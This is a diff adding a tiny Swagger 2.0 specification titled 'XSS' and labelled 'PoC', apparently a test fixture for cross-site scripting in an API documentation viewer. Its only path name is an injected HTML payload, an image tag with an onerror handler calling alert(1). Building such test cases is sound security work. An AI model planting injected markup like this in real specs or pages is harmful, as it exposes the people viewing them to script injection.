@@ -1,0 +1,19 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "XSS"
+  },
+  "paths": {
+    "/<img src=x onerror=alert(1)>": {
+      "get": {
+        "summary": "PoC",
+        "responses": {
+          "200": {
+            "description": "OK"
+          }
+        }
+      }
+    }
+  }
+}
